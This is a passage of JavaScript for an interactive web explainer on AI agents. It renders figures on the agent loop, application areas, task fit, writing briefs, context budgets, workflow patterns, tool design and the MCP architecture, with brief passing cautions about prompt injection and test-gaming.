      { t: 'It reports back', x: 'Satisfied, the model replies with text instead of a tool call. Stop reason: end_turn. The loop ends. Nine messages, about 9,700 tokens, all re-sent on every turn.', j: '{\n  "stop_reason": "end_turn",\n  "content": "Fixed: line 42 applied the discount as a\\n  multiplier. All 14 checkout tests pass."\n}', add: [['text', 'answer', 'Fixed line 42. All 14 tests pass.', 60]] },
      { t: 'If the task kept going…', x: 'On a long task the history balloons. Compaction replaces old turns with a summary of decisions and open threads; stale tool results can simply be cleared. The agent continues with a lean context.', j: '"Summary: fixed discount bug in pricing.py:42\n (multiplier → percentage). Tests green.\n Next: user asked to also update cart.py."', compact: true },
      { t: 'What you just saw', x: 'Every agent, however sophisticated, is this loop: send context, get a tool call, run it, append the result, repeat. Better agents differ in their tools, their context management and their ability to verify.', j: '' }
    ];
    const stack = $('#simStack'), tok = $('#simTok'), barEl = $('#simBar');
    let s = 0, items = [], timer = null;
    const render = () => {
      stack.innerHTML = '';
      let total = 0;
      items.forEach((it) => { if (!it.gone) total += it[3]; const li = el('li', 'k-' + it[0] + (it.gone ? ' gone' : ''), `<b>${it[1]}</b><span>${esc(it[2])}</span><em>${it[3].toLocaleString()}</em>`); stack.append(li); });
      stack.scrollTop = stack.scrollHeight;
      tok.textContent = total.toLocaleString() + ' tokens';
      barEl.style.width = Math.min(100, total / 12000 * 100) + '%';
    };
    const reset = () => { s = 0; items = BASE.map((b) => b.slice()); stop(); render(); $('#simStepN').textContent = `Step 0 of ${STEPS.length}`; $('#simTitle').textContent = 'Ready'; $('#simText').textContent = 'The context starts with the system prompt, the tool definitions and your request. Press Next to send the first request.'; $('#simJson').hidden = true; $('#simNext').disabled = false; };
    const next = () => {
      if (s >= STEPS.length) return;
      const st = STEPS[s]; s++;
      if (st.add) st.add.forEach((a) => items.push(a.slice()));
      if (st.compact) { items.forEach((it, i) => { if (i >= 3 && i < items.length - 1) it.gone = true; }); items.push(['sum', 'summary', 'Compacted history: decisions + open threads', 140]); }
      render();
      $('#simStepN').textContent = `Step ${s} of ${STEPS.length}`; $('#simTitle').textContent = st.t; $('#simText').textContent = st.x;
      const j = $('#simJson'); j.hidden = !st.j; j.textContent = st.j;
      if (s >= STEPS.length) { $('#simNext').disabled = true; stop(); }
    };
    const stop = () => { clearInterval(timer); timer = null; $('#simPlay').textContent = 'Play'; };
    $('#simNext').onclick = () => { stop(); next(); };
    $('#simReset').onclick = reset;
    $('#simPlay').onclick = () => { if (timer) return stop(); if (s >= STEPS.length) reset(); $('#simPlay').textContent = 'Pause'; next(); timer = setInterval(next, 2600); };
    reset();
  })();

  /* ═════════ FIG 3 · APPS ═════════ */
  (() => {
    const A = [
      ['Coding agents', 'Software', 'CD', '#ff5a36', 'Write features, fix bugs, refactor and test inside real codebases, from the terminal, IDE or cloud.', 5, 'Claude Code, OpenAI Codex, Cursor, GitHub Copilot’s coding agent, Google Antigravity.', 'Code is text, tools are rich (search, edit, run) and tests give objective feedback.', 'Review every change. Agents can game tests or wander out of scope.'],
      ['Code review & migration', 'Software', 'MG', '#ff5a36', 'Review pull requests, upgrade frameworks, migrate languages and APIs across many files.', 4, 'Automated PR review bots; large library upgrades split across parallel agents.', 'Repetitive, well-specified, and checkable with compilers and tests.', 'Large migrations need staged rollouts and human spot checks.'],
      ['Deep research', 'Research', 'RS', '#4053d6', 'Run dozens of searches, read sources and write a cited report or literature review.', 4, 'Deep research modes in Claude, ChatGPT and Gemini; custom research agents over internal documents.', 'Breadth is the bottleneck, and subagents can search in parallel.', 'Check the citations: agents can misread or over-trust weak sources.'],
      ['Data analysis', 'Data', 'DA', '#0e8a8c', 'Load files, clean data, run analyses in code, make charts and explain the results.', 4, 'Code execution in AI assistants; notebook agents; spreadsheet agents.', 'Code execution makes results reproducible and verifiable.', 'Silent errors in joins or filters. Ask for the code and sanity checks.'],
      ['Customer support', 'Business', 'CS', '#a2479b', 'Resolve tickets end to end: look up accounts, apply policy, take actions, escalate edge cases.', 4, 'Support agents in help desks; refund and returns agents; tier-1 IT helpdesks.', 'High volume, clear policies, and outcomes you can measure.', 'Put policy in tools, not prompts. Watch for injection in customer messages.'],
      ['Back-office documents', 'Business', 'BO', '#a2479b', 'Extract, check and route invoices, claims, contracts and forms; reconcile against systems.', 3, 'Invoice processing, insurance claim triage, KYC document checks.', 'Structured outputs and validation rules make errors catchable.', 'Edge cases and messy scans. Keep humans on exceptions.'],
      ['IT & DevOps operations', 'Software', 'OP', '#ff5a36', 'Investigate alerts, read logs, run diagnostics and propose or apply fixes.', 3, 'Incident-response assistants; on-call agents that gather context before paging a human.', 'Most of incident work is gathering context, which agents do fast.', 'Never give production write access without approval gates.'],
      ['Security operations', 'Software', 'SE', '#ff5a36', 'Triage alerts, enrich indicators, hunt through logs and draft incident reports.', 3, 'SOC copilots and triage agents.', 'Large alert volumes and repetitive enrichment steps.', 'Agents themselves become attack surface. Least privilege is essential.'],
      ['Sales & marketing ops', 'Business', 'SM', '#a2479b', 'Research accounts, enrich CRM records, draft personalised outreach, update pipelines.', 3, 'Account research agents; CRM hygiene agents.', 'Lots of lookup-and-summarise work across many tools.', 'Human approval before anything is sent to customers.'],
      ['Personal assistant', 'Personal', 'PA', '#c98a00', 'Triage email, schedule meetings, plan trips, manage to-dos across your apps.', 3, 'Assistants connected to email, calendar and documents through MCP connectors.', 'Your apps are connectable and tasks are frequent.', 'A classic lethal-trifecta setup: private data, untrusted email, ability to send.'],
      ['Computer & browser use', 'Personal', 'CU', '#c98a00', 'Operate websites and desktop apps that have no API: forms, bookings, legacy systems.', 2, 'Browser agents in AI assistants and browsers; desktop automation agents.', 'Reaches software nothing else can.', 'Slow and brittle; vulnerable to injection from web pages. Supervise.'],
      ['Science & engineering', 'Research', 'SC', '#4053d6', 'Design experiments, run simulations, analyse results and search literature.', 2, 'Lab-automation agents; agents that run and tune simulation code.', 'Long, multi-step and tool-heavy, with measurable results.', 'Early days. Domain experts must validate everything.']
    ];
    const box = $('#apps'), filt = $('#appFilter');
    const areas = ['All', ...new Set(A.map((a) => a[1]))];
    let cur = 'All';
    const render = () => {
      box.innerHTML = '';
      A.filter((a) => cur === 'All' || a[1] === cur).forEach((a) => {
        const [n, area, mono, col, blurb, mat, ex, why, watch] = a;
        const c = el('button', 'app', `<div class="app-top"><span class="app-ic" style="background:${col}1f;color:${col};font:800 .82rem/1 var(--sans)">${mono}</span><div><span class="area">${area}</span><h4>${n}</h4></div></div><p>${blurb}</p><div class="mat">Maturity ${[1, 2, 3, 4, 5].map((k) => `<i class="${k <= mat ? 'on' : ''}"></i>`).join('')}</div>
          <div class="app-more"><div><h5>Examples</h5><p>${ex}</p></div><div><h5>Why it works</h5><p>${why}</p></div><div><h5>Watch out</h5><p>${watch}</p></div></div>`);
        c.setAttribute('aria-expanded', 'false');
        c.onclick = () => { const was = c.classList.contains('open'); $$('.app', box).forEach((x) => { x.classList.remove('open'); x.setAttribute('aria-expanded', 'false'); }); if (!was) { c.classList.add('open'); c.setAttribute('aria-expanded', 'true'); } };
        box.append(c);
      });
    };
    areas.forEach((a) => { const b = el('button', 'chip' + (a === cur ? ' on' : ''), a); b.onclick = () => { cur = a; $$('.chip', filt).forEach((x) => x.classList.toggle('on', x === b)); render(); }; filt.append(b); });
    render();
  })();

  /* ═════════ FIG 4 · FIT ═════════ */
  (() => {
    const Q = [
      ['cx', 'Does the task take several steps that can’t be fully written down in advance?'],
      ['val', 'Is a good result worth extra cost and a few minutes of waiting?'],
      ['via', 'Could a capable person do it with the tools and data you can give the agent?'],
      ['err', 'If the agent gets it wrong, is the mistake cheap to catch and undo?'],
      ['ver', 'Is there an objective way to check the result (tests, rules, sources)?'],
      ['vol', 'Does the task come up often?']
    ];
    const A = {}; Q.forEach(([k]) => { A[k] = 1; });
    const qs = $('#fitQs'), out = $('#fitOut');
    Q.forEach(([k, q]) => {
      const d = el('div', 'fq', `<p>${q}</p>`), seg = el('div', 'seg');
      [['No', 0], ['Partly', 1], ['Yes', 2]].forEach(([l, v]) => { const b = el('button', v === A[k] ? 'on' : '', l); b.onclick = () => { A[k] = v; $$('button', seg).forEach((x) => x.classList.toggle('on', x === b)); upd(); }; seg.append(b); });
      d.append(seg); qs.append(d);
    });
    const upd = () => {
      const sc = Object.values(A).reduce((s, v) => s + v, 0) / 12;
      let t, p, col;
      if (A.via === 0) { t = 'Not yet'; p = 'If the tools or data aren’t available, no model will do it. Fix access first, or keep it manual.'; col = '#6b6f7a'; }
      else if (A.cx === 0) { t = 'Single call or workflow'; p = 'The steps are known, so write them down. A fixed workflow will be cheaper, faster and more predictable than an agent.'; col = '#4053d6'; }
      else if (A.err === 0 && A.ver === 0) { t = 'Assistant, human in charge'; p = 'Mistakes are costly and hard to detect. Let an AI draft and research, but keep a person making and executing the decisions.'; col = '#c98a00'; }
      else if (A.val === 0) { t = 'Probably not worth it'; p = 'An agent could do it, but the value doesn’t justify the cost and latency. Look for a higher-value task.'; col = '#6b6f7a'; }
      else if (sc >= .75) { t = 'Strong agent candidate'; p = A.err < 2 ? 'Build an agent with approval gates on the risky steps, and an eval set from day one.' : 'Multi-step, valuable, doable and checkable. Start with a narrow version and expand.'; col = '#0e8a8c'; }
      else { t = 'Agent with guardrails'; p = 'Worth trying, carefully: narrow the scope, add checkpoints and human approval where errors would hurt, and measure against a baseline.'; col = '#ff5a36'; }
      const ang = -90 + sc * 180;
      out.innerHTML = `<svg class="gauge" viewBox="0 0 200 116" aria-hidden="true"><defs><linearGradient id="gg" x1="0" x2="1"><stop offset="0" stop-color="#6b6f7a"/><stop offset=".5" stop-color="#ffc94a"/><stop offset="1" stop-color="#0e8a8c"/></linearGradient></defs><path d="M20 100 A80 80 0 0 1 180 100" fill="none" stroke="url(#gg)" stroke-width="14" stroke-linecap="round"/><g style="transform:rotate(${ang}deg);transform-origin:100px 100px;transition:transform .6s var(--ease)"><line x1="100" y1="100" x2="100" y2="34" stroke="#13161d" stroke-width="4" stroke-linecap="round"/></g><circle cx="100" cy="100" r="8" fill="#13161d"/></svg><h4 style="color:${col}">${t}</h4><p>${p}</p>`;
    };
    upd();
  })();

  /* ═════════ FIG 5 · BRIEF ═════════ */
  (() => {
    const BASE = 'Do a competitor analysis of meal-kit companies.';
    const P = [
      ['goal', 'Goal & why', 'Why you need it', 18, 'We’re deciding whether to launch a vegetarian meal-kit line in Bengaluru next quarter; this analysis informs a go/no-go meeting on Friday.'],
      ['ctx', 'Context', 'What to read, what’s known', 14, 'Focus on the three biggest players in India by orders. Our internal notes are in /research/mealkits.md; we already know their prices, so focus on menus and positioning.'],
      ['con', 'Constraints', 'Boundaries and rules', 12, 'Use only sources from 2025 or later. Don’t contact any company. Flag anything you can’t verify rather than guessing.'],
      ['done', 'Definition of done', 'How we’ll know it worked', 18, 'Done when each competitor has: vegetarian share of menu, price per serving, delivery cities, and one clear weakness, each with a cited source.'],
      ['out', 'Output', 'Format, length, location', 12, 'A one-page table plus a 200-word recommendation, saved as competitors.md.'],
      ['chk', 'Checkpoints', 'When to stop and ask', 10, 'First, show me your list of competitors and sources before writing anything.'],
      ['ex', 'Example', 'Show the shape you want', 8, 'Example row: “BoxCo | 40% veg | ₹180/serving | 6 cities | weak on regional cuisine [source]”.']
    ];
    const on = new Set();
    const parts = $('#briefParts'), txt = $('#briefText');
    P.forEach(([k, n, s]) => {
      const lab = el('label', 'bp', `<input type="checkbox"><span><b>${n}</b><small>${s}</small></span>`);
      $('input', lab).onchange = (e) => { e.target.checked ? on.add(k) : on.delete(k); upd(); };
      parts.append(lab);
    });
    const upd = () => {
      const score = 20 + P.filter((p) => on.has(p[0])).reduce((s, p) => s + p[3], 0);
      $('#briefBar').style.width = score + '%'; $('#briefPct').textContent = score + '%';
      txt.innerHTML = esc(BASE) + P.filter((p) => on.has(p[0])).map((p) => `\n\n<span class="hl">${esc(p[1])}:</span> ${esc(p[4])}`).join('');
      let pred;
      if (score <= 20) pred = 'Likely result: a generic essay about global brands you didn’t care about, with prices you already knew and no sources. Fluent, confident and mostly useless.';
      else if (!on.has('done') && !on.has('goal')) pred = 'Better aimed, but the agent still has to guess what “finished” means. Expect something long, unevenly detailed, and missing the one figure you needed.';
      else if (!on.has('done')) pred = 'It knows why this matters, so its judgment calls improve. But without a definition of done, it may stop early or pad the report.';
      else if (!on.has('chk') && score < 80) pred = 'Good odds of a useful result. The risk now is it spends an hour on the wrong three companies before you notice. A checkpoint would catch that.';
      else if (score < 90) pred = on.has('chk') ? 'Strong brief. Expect a targeted, sourced table close to what you need, with a short check-in before the heavy work.' : 'Strong brief. Expect a targeted, sourced table close to what you need. Adding a checkpoint would let you catch a wrong turn before the heavy work.';
      else pred = 'Excellent. The agent knows the purpose, the boundaries, what done looks like, the format and when to check in. This is how professionals delegate.';
      $('#briefPred').textContent = pred;
    };
    upd();
  })();

  /* ═════════ FIG 6 · CONTEXT BUDGET ═════════ */
  (() => {
    const C = [['sys', 'System prompt', '#8d9bff', 4], ['tools', 'Tool definitions', '#e08ad8', 12], ['hist', 'Conversation history', '#ffc94a', 30], ['docs', 'Retrieved documents', '#5fd0c8', 50], ['res', 'Tool results', '#ff8a6e', 40], ['notes', 'Working notes', '#3ecf8e', 2]];
    const V = {}; C.forEach((c) => { V[c[0]] = c[3]; });
    let W = 200;
    const ctl = $('#budCtl'), barEl = $('#budBar'), leg = $('#budLegend'), ver = $('#budVerdict');
    C.forEach(([k, n, col]) => {
      const row = el('div', 'bud-row', `<label for="bud-${k}"><span><i style="background:${col}"></i>${n}</span><b id="budv-${k}"></b></label>`);
      const r = el('input'); r.type = 'range'; r.id = 'bud-' + k; r.min = 0; r.max = 300; r.step = 1; r.value = V[k];
      r.oninput = () => { V[k] = +r.value; upd(); };
      row.append(r); ctl.append(row);
      leg.insertAdjacentHTML('beforeend', `<span><i style="background:${col}"></i>${n.split(' ')[0]}</span>`);
    });
    $$('#budWin button').forEach((b) => b.onclick = () => { W = +b.dataset.w; $$('#budWin button').forEach((x) => x.classList.toggle('on', x === b)); upd(); });
    const upd = () => {
      const used = C.reduce((s, c) => s + V[c[0]], 0), cap = Math.max(W, used);
      barEl.innerHTML = '';
      C.forEach(([k, , col]) => { $('#budv-' + k).textContent = V[k] + 'K'; const s = el('span'); s.style.flexBasis = (V[k] / cap * 100) + '%'; s.style.background = col; s.title = k; barEl.append(s); });
      const free = el('span', 'free'); free.style.flexBasis = (Math.max(0, W - used) / cap * 100) + '%'; barEl.append(free);
      const pct = used / W;
      const quality = clamp(1 - Math.max(0, used - 20) / 400, .15, 1);
      const segs = Math.round(quality * 10);
      const stale = (V.hist + V.res) / Math.max(1, used), docs = V.docs / Math.max(1, used), tools = V.tools / Math.max(1, used);
      let head, body;
      if (used > W) { head = 'It doesn’t fit'; body = `${used}K tokens in a ${W}K window. The request will fail. Compact the history, clear old tool results or delegate reading to subagents.`; }
      else if (used > 150) { head = 'Long-context territory'; body = `${used}K tokens (${Math.round(pct * 100)}% of the window). It fits, but recall and reasoning typically degrade at this length, and every turn is slow and costly. Trim aggressively.`; }
      else if (pct > .7) { head = 'Crowded'; body = `${Math.round(pct * 100)}% full. Little room for the work ahead; plan to compact soon.`; }
      else if (used < 30) { head = 'Lean and focused'; body = `${used}K tokens. Plenty of headroom and the model’s attention is concentrated on what matters.`; }
      else { head = 'Healthy'; body = `${used}K tokens, ${Math.round(pct * 100)}% of the window.`; }
      const tips = [];
      if (stale > .55 && used > 40) tips.push('History and old tool results dominate. Clear stale results or compact.');
      if (docs > .45 && used > 40) tips.push('Documents take most of the space. Retrieve just in time instead of loading everything up front.');
      if (tools > .25 && used > 20) tips.push('Tool definitions are heavy. Consolidate tools or load them on demand (tool search, Skills).');
      if (V.notes === 0) tips.push('No working notes: progress may be lost when you compact.');
      ver.innerHTML = `<b>${head}</b>${body}<div class="att" aria-label="Attention quality">${Array.from({ length: 10 }, (_, i) => `<i style="background:${i < segs ? (segs > 6 ? '#3ecf8e' : segs > 3 ? '#ffc94a' : '#ff5a36') : ''}"></i>`).join('')}</div><small style="color:#8e95a5;font:500 .74rem/1.4 var(--mono)">Illustrative attention quality</small>${tips.length ? '<ul style="margin:10px 0 0;padding-left:1.1em">' + tips.map((t) => `<li>${t}</li>`).join('') + '</ul>' : ''}`;
    };
    upd();
  })();

  /* ═════════ FIG 7 · PATTERNS ═════════ */
  (() => {
    const P = [
      { n: 'Prompt chaining', d: 'Break the task into a fixed sequence of steps. Each model call works on the previous output, with programmatic checks (“gates”) in between.', w: 'The task splits cleanly into stages and you want each step easier and more accurate.', ex: 'Write an outline, check it covers required points, then write the draft, then translate it.', m: [5, 2, 2],
        nodes: [['in', 30, 90, 'Input', 'io'], ['a', 130, 90, 'LLM 1', 'llm'], ['g', 230, 90, 'Gate', 'gate'], ['b', 330, 90, 'LLM 2', 'llm'], ['c', 430, 90, 'LLM 3', 'llm'], ['out', 530, 90, 'Output', 'io']], edges: [['in', 'a'], ['a', 'g'], ['g', 'b'], ['b', 'c'], ['c', 'out']], seq: [[0], [1], [2], [3], [4]] },
      { n: 'Routing', d: 'Classify the input first, then send it to a specialised prompt, tool set or model.', w: 'Inputs fall into distinct categories that are best handled differently, or easy cases can go to a cheaper model.', ex: 'Support tickets routed to refunds, technical help or general questions; simple ones to a small fast model.', m: [5, 1, 1],
        nodes: [['in', 40, 100, 'Input', 'io'], ['r', 170, 100, 'Router', 'llm'], ['a', 330, 35, 'Refunds', 'llm'], ['b', 330, 100, 'Tech help', 'llm'], ['c', 330, 165, 'General', 'llm'], ['out', 500, 100, 'Output', 'io']], edges: [['in', 'r'], ['r', 'a'], ['r', 'b'], ['r', 'c'], ['a', 'out'], ['b', 'out'], ['c', 'out']], seq: [[0], [2], [5]] },
      { n: 'Parallelisation', d: 'Run several model calls at once: different subtasks (sectioning) or the same task several times for a vote.', w: 'Subtasks are independent and speed matters, or you need more confidence through multiple attempts.', ex: 'One call answers the question while another screens it for policy issues; three reviewers vote on whether code has a vulnerability.', m: [4, 3, 1],
        nodes: [['in', 40, 100, 'Input', 'io'], ['a', 220, 35, 'LLM', 'llm'], ['b', 220, 100, 'LLM', 'llm'], ['c', 220, 165, 'LLM', 'llm'], ['g', 380, 100, 'Aggregate', 'gate'], ['out', 520, 100, 'Output', 'io']], edges: [['in', 'a'], ['in', 'b'], ['in', 'c'], ['a', 'g'], ['b', 'g'], ['c', 'g'], ['g', 'out']], seq: [[0, 1, 2], [3, 4, 5], [6]] },
      { n: 'Orchestrator–workers', d: 'A lead model breaks the task down on the fly, delegates pieces to workers, then synthesises their results.', w: 'You can’t predict the subtasks in advance; they depend on the input.', ex: 'A coding change that touches an unknown number of files; a research question needing an unknown number of searches.', m: [3, 4, 3],
        nodes: [['in', 40, 100, 'Input', 'io'], ['o', 170, 100, 'Orchestrator', 'llm'], ['a', 330, 35, 'Worker', 'llm'], ['b', 330, 100, 'Worker', 'llm'], ['c', 330, 165, 'Worker', 'llm'], ['s', 470, 100, 'Synthesise', 'llm'], ['out', 570, 100, 'Out', 'io']], edges: [['in', 'o'], ['o', 'a'], ['o', 'b'], ['o', 'c'], ['a', 's'], ['b', 's'], ['c', 's'], ['s', 'out']], seq: [[0], [1, 2, 3], [4, 5, 6], [7]] },
      { n: 'Evaluator–optimiser', d: 'One model generates; another evaluates against clear criteria and sends feedback until the work passes.', w: 'You have clear evaluation criteria and iteration measurably improves quality.', ex: 'Literary translation refined against a style rubric; code revised until a reviewer model and the tests both pass.', m: [4, 3, 3],
        nodes: [['in', 50, 100, 'Input', 'io'], ['g', 210, 100, 'Generator', 'llm'], ['e', 390, 100, 'Evaluator', 'gate'], ['out', 540, 100, 'Output', 'io']], edges: [['in', 'g'], ['g', 'e', -40], ['e', 'g', -40], ['e', 'out']], seq: [[0], [1], [2], [1], [2], [3]] },
      { n: 'Autonomous agent', d: 'The model plans and acts in a loop with tools, using feedback from the environment, until the goal is met or it needs a human.', w: 'Open-ended problems where the number of steps can’t be predicted and you trust the model within a sandbox.', ex: 'A coding agent resolving a GitHub issue; a computer-use agent completing a multi-site task.', m: [2, 4, 4],
        nodes: [['h', 60, 100, 'Human', 'io'], ['l', 250, 100, 'LLM agent', 'llm'], ['env', 460, 100, 'Environment', 'env'], ['st', 250, 180, 'Stop', 'gate']], edges: [['h', 'l'], ['l', 'env', -45], ['env', 'l', -45], ['l', 'st']], seq: [[0], [1], [2], [1], [2], [3]] },
      { n: 'Multi-agent research', d: 'A lead agent plans, spawns subagents that each explore in their own context window, and combines their findings.', w: 'Broad, parallelisable tasks with more information than fits in one context.', ex: 'Anthropic’s research feature: a lead agent with parallel subagents beat a single agent by about 90% on its internal eval, using about 15× the tokens of chat.', m: [2, 5, 3],
        nodes: [['in', 40, 100, 'Query', 'io'], ['lead', 170, 100, 'Lead agent', 'llm'], ['a', 330, 30, 'Subagent', 'llm'], ['b', 330, 100, 'Subagent', 'llm'], ['c', 330, 170, 'Subagent', 'llm'], ['t', 480, 100, 'Search & tools', 'env'], ['out', 170, 180, 'Report', 'io']], edges: [['in', 'lead'], ['lead', 'a'], ['lead', 'b'], ['lead', 'c'], ['a', 't'], ['b', 't'], ['c', 't'], ['lead', 'out']], seq: [[0], [1, 2, 3], [4, 5, 6], [7]] }
    ];
    const tabs = $('#patTabs'), svgBox = $('#patSvg'), info = $('#patInfo');
    const show = (i) => {
      const p = P[i];
      $$('.chip', tabs).forEach((b, j) => b.classList.toggle('on', j === i));
      const svg = sv('svg', { viewBox: '0 0 610 210', role: 'img', 'aria-label': p.n + ' diagram' });
      const pos = {}; p.nodes.forEach(([id, x, y]) => { pos[id] = [x, y]; });
      const paths = p.edges.map(([a, b, bend], k) => {
        const [x1, y1] = pos[a], [x2, y2] = pos[b];
        const d = bend ? `M${x1} ${y1} Q${(x1 + x2) / 2} ${(y1 + y2) / 2 + bend} ${x2} ${y2}` : `M${x1} ${y1} L${x2} ${y2}`;
        const pth = sv('path', { d, class: 'ed', id: `pe${i}-${k}` }); svg.append(pth); return pth;
      });
      if (!RM) {
        const stage = 1.0, total = p.seq.length * stage + .6;
        p.seq.forEach((grp, si) => grp.forEach((k) => {
          const c = sv('circle', { r: 5.5, class: 'dot', opacity: 0 });
          const am = sv('animateMotion', { dur: total + 's', repeatCount: 'indefinite', keyPoints: '0;0;1;1', keyTimes: `0;${(si * stage / total).toFixed(3)};${((si + 1) * stage / total).toFixed(3)};1`, calcMode: 'linear' });
          const mp = sv('mpath', {}); mp.setAttributeNS('http://www.w3.org/1999/xlink', 'href', `#pe${i}-${k}`); mp.setAttribute('href', `#pe${i}-${k}`); am.append(mp);
          const op = sv('animate', { attributeName: 'opacity', dur: total + 's', repeatCount: 'indefinite', values: '0;0;1;1;0;0', keyTimes: `0;${(si * stage / total).toFixed(3)};${((si * stage + .1) / total).toFixed(3)};${(((si + 1) * stage - .1) / total).toFixed(3)};${((si + 1) * stage / total).toFixed(3)};1` });
          c.append(am, op); svg.append(c);
        }));
      }
      p.nodes.forEach(([id, x, y, label, cls]) => {
        const w = Math.max(64, label.length * 7.4 + 22);
        const g = sv('g', { class: 'nd ' + cls }); g.append(sv('rect', { x: x - w / 2, y: y - 17, width: w, height: 34, rx: 9 }));
        const t = sv('text', { x, y: y + 4 }); t.textContent = label; g.append(t); svg.append(g);
      });
      svgBox.innerHTML = ''; svgBox.append(svg);
      const m = (lab, v) => `<div class="mtr">${lab}<i>${[1, 2, 3, 4, 5].map((k) => `<b class="${k <= v ? 'on' : ''}"></b>`).join('')}</i></div>`;
      info.innerHTML = `<h4>${p.n}</h4><p>${p.d}</p><div class="meters">${m('Predictable', p.m[0])}${m('Cost', p.m[1])}${m('Latency', p.m[2])}</div><p class="use"><b>Use when:</b> ${p.w}<br><br><b>Example:</b> ${p.ex}</p>`;
    };
    P.forEach((p, i) => { const b = el('button', 'chip', p.n); b.onclick = () => show(i); tabs.append(b); });
    show(0);
  })();

  /* ═════════ FIG 8 · TOOL CLINIC ═════════ */
  (() => {
    const T = [
      { n: 'A vague search tool', b: `{
  "name": "search",
  "description": "Searches.",
  "input_schema": {
    "type": "object",
    "properties": { "q": { "type": "string" } }
  }
}`, a: `{
  "name": "crm_search_customers",
  "description": "Find customers in the CRM by name,
    email or phone. Use before any action on a
    customer account. Returns up to 'limit' matches
    with name, email, plan and customer_id.",
  "input_schema": {
    "type": "object",
    "properties": {
      "query": { "type": "string",
        "description": "Name, email or phone" },
      "limit": { "type": "integer", "default": 5 },
      "response_format": { "enum": ["concise", "detailed"] }
    },
    "required": ["query"]
  }
}`, notes: ['<b>Namespaced name</b>: the agent can’t confuse it with the docs search or web search.', '<b>Description says when to use it</b>, not just what it does.', '<b>Described parameters</b> with sensible defaults and a required field.', '<b>Response format option</b> lets the agent save tokens when it only needs IDs.'] },
      { n: 'Unhelpful errors', b: `// The agent called:
get_invoice({ "id": "inv 2041" })

// Tool returned:
{ "error": 404 }`, a: `// The agent called:
get_invoice({ "id": "inv 2041" })

// Tool returned:
"No invoice with ID 'inv 2041'. Invoice IDs look
like 'INV-002041'. Did you mean INV-002041
(Kora Home, ₹18,400, 3 Nov)? You can also search
by customer with billing_search_invoices."`, notes: ['<b>Says what went wrong</b> in plain language.', '<b>Shows the expected format</b>, so the agent fixes its own call.', '<b>Suggests the likely match</b> and an alternative tool.', 'Agents read errors as instructions. A good error turns a dead end into one more step.'] },
      { n: 'Too many tiny tools', b: `list_users()
list_events(user_id)
get_free_slots(user_id, date)
create_event(title, start, end, attendees)
send_invite(event_id, user_id)

// The agent must chain 5 calls and
// hold every result in context.`, a: `schedule_meeting({
  "attendees": ["priya@kora.in", "arjun@kora.in"],
  "duration_minutes": 30,
  "window": "next week, mornings",
  "title": "Q1 menu review"
})

→ "Booked Tue 9:30–10:00. Invites sent to
   Priya and Arjun. No conflicts."`, notes: ['<b>One tool for one real job</b>: finding a slot and booking is a single intent.', '<b>Fewer steps</b> means fewer chances to go wrong and far less context used.', '<b>Human-readable result</b> confirms what happened.', 'Keep the small tools for the rare cases that need them, but lead with the workflow tool.'] }
    ];
    const tabs = $('#toolTabs');
    const show = (i) => { const t = T[i]; $$('.chip', tabs).forEach((b, j) => b.classList.toggle('on', j === i)); $('#toolBefore').textContent = t.b; $('#toolAfter').textContent = t.a; $('#toolNotes').innerHTML = t.notes.map((n) => `<li>${n}</li>`).join(''); };
    T.forEach((t, i) => { const b = el('button', 'chip', t.n); b.onclick = () => show(i); tabs.append(b); });
    show(0);
  })();

  /* ═════════ FIG 9 · MCP ═════════ */
  (() => {
    const svg = $('#mcpSvg'), info = $('#mcpInfo');
    const PARTS = {
      host: ['Host', 'The AI application the person uses: Claude, ChatGPT, an IDE like VS Code or Cursor, or your own agent. It contains the model and decides which servers to connect and what the user must approve.'],
      client: ['Client', 'One client per server lives inside the host and keeps a one-to-one connection, passing requests and results back and forth using JSON-RPC messages.'],
      server: ['Server', 'A small program that exposes capabilities in a standard form. Write one GitHub server, and every MCP host can use GitHub. Thousands exist, for everything from databases to design tools.'],
      prims: ['What servers offer', '<b>Tools</b>: functions the model can call (create_issue, run_query). <b>Resources</b>: data the app can read into context (files, records). <b>Prompts</b>: reusable templates the user can pick. Servers can also ask the host for things, such as a model completion or user input.'],
      ext: ['The real system', 'The server talks to the actual service in its own way: an API, a database driver, the local file system. The model never sees credentials; the server holds them.'],
      wire: ['Transports', 'Local servers usually run as a subprocess talking over standard input and output (stdio). Remote servers use Streamable HTTP, with OAuth for authorisation, so a server can be a hosted service anyone connects to.']
    };
    const box = (id, x, y, w, h, fill, label, sub) => {
      const g = sv('g', { class: 'part', 'data-p': id, tabindex: 0, role: 'button', 'aria-label': PARTS[id][0] });
      g.append(sv('rect', { x, y, width: w, height: h, rx: 12, fill, stroke: '#3a4256', 'stroke-width': 1.5 }));
      const t = sv('text', { x: x + w / 2, y: y + (sub ? h / 2 - 2 : h / 2 + 4) }); t.textContent = label; g.append(t);
      if (sub) { const s = sv('text', { x: x + w / 2, y: y + h / 2 + 14, class: 'sm' }); s.textContent = sub; g.append(s); }
      return g;
    };
    svg.append(box('host', 14, 20, 210, 260, '#171b24', '', ''));
    const ht = sv('text', { x: 119, y: 46 }); ht.textContent = 'Host app'; svg.append(ht);
    const hs = sv('text', { x: 119, y: 62, class: 'sm' }); hs.textContent = 'Claude · IDE · your agent'; svg.append(hs);
    svg.append(box('client', 40, 90, 158, 56, '#212734', 'MCP client 1', 'JSON-RPC'));
    svg.append(box('client', 40, 190, 158, 56, '#212734', 'MCP client 2', 'JSON-RPC'));
    for (const y of [118, 218]) { const w = sv('path', { d: `M198 ${y} L300 ${y}`, class: 'wire' }); svg.append(w); }
    const wg = sv('g', { class: 'part', 'data-p': 'wire', tabindex: 0, role: 'button', 'aria-label': 'Transports' }); wg.append(sv('rect', { x: 212, y: 152, width: 76, height: 30, rx: 8, fill: '#0f1218', stroke: '#3a4256' })); const wt = sv('text', { x: 250, y: 171, class: 'sm' }); wt.textContent = 'stdio / HTTP'; wg.append(wt); svg.append(wg);
    svg.append(box('server', 300, 90, 150, 56, '#2a1c1a', 'GitHub server', 'tools · resources'));
    svg.append(box('server', 300, 190, 150, 56, '#2a1c1a', 'Database server', 'tools · resources'));
    for (const y of [118, 218]) svg.append(sv('path', { d: `M450 ${y} L500 ${y}`, class: 'wire' }));
    svg.append(box('ext', 500, 90, 126, 56, '#14262a', 'GitHub API', ''));
    svg.append(box('ext', 500, 190, 126, 56, '#14262a', 'Postgres', ''));
    svg.append(box('prims', 300, 20, 326, 46, '#1d1f33', 'Tools · Resources · Prompts', ''));
    const show = (id) => { $$('.part', svg).forEach((g) => g.classList.toggle('on', g.dataset.p === id)); const [t, d] = PARTS[id]; info.innerHTML = `<h4>${t}</h4><p>${d}</p>`; };
